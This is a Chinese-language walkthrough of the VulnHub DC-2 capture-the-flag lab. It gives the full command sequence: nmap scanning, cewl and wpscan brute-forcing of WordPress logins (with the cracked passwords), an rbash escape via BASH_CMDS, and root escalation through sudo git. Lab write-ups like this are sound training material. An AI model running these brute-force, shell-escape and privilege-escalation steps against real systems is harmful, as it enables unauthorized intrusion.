【vulnhub】---DC-2靶机
2023-03-12 15:50:50

0x01 下载地址

https://www.vulnhub.com/entry/dc-2,311/

0x02 靶机目标

5个Flag

0x03 工具准备

Linux Restricted Shell绕过技巧总结：

  * https://www.freebuf.com/articles/system/188989.html

0x04 详细步骤

一、主机发现

sudo arp-scan -l

二、端口扫描

nmap -p- 10.0.0.17
nmap -p80,7744 -sC -sV 10.0.0.17

三、Web信息收集

浏览器访问http://10.0.0.17，发现URL被重定向到了http://dc-2

点击Flag按钮，提示需要cewl

故使用cewl制作密码字典，

cewl http://dc-2/ -w dic.txt
cat dic.txt | wc -l

爬取网站目录，找到后台目录http://10.0.0.17/wp-admin/

dirsearch -u http://10.0.0.17

使用wpscan扫描用户，发现存在3个用户

wpscan --url http://dc-2 -e u
vi user.txt
admin
jerry
tom

对这3个用户进行暴力破解，获得两个账户密码

wpscan --url http://dc-2 -U /home/kali/user.txt -P /home/kali/dic.txt 或者
wpscan --url http://dc-2 --passwords /home/kali/dic.txt

jerry / adipiscing
tom / parturient

使用jerry / adipiscing登录后台

点击Pages->Flag2查看相关信息，根据提示尝试另外的方法进入系统


SSH登录

根据之前nmap扫描结果得知，靶机7744端口上运行着SSH服务，故尝试使用tom / parturient登录，登录后发现竟然没有id命令

ssh tom@10.0.0.17 -p 7744
parturient
id

四、主机信息收集

pwd
ls

发现靶机使用的rbash，没有Tab补全功能，没有cat命令，查看tom用户环境变量，以及可用命令

echo $PATH
ls -al /home/tom/usr/bin

但可用用过less查看flag3.txt

less flag3.txt

五、绕过rshell

由于rbash功能

BASH_CMDS[a]=/bin/sh;a # /bin/sh赋值给a,执行a
export PATH=$PATH:/bin/:/usr/bin # 导入环境变量

查看/home目录，获取flag4

cd /home
ls
cd jerry
ls
cat flag4.txt
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!

六、Root提权

切换jerry身份

su jerry
adipiscing

查询sudo权限

sudo -l

sudo进入交互模式

sudo git --help status
!/bin/bash

直接获取rootShell
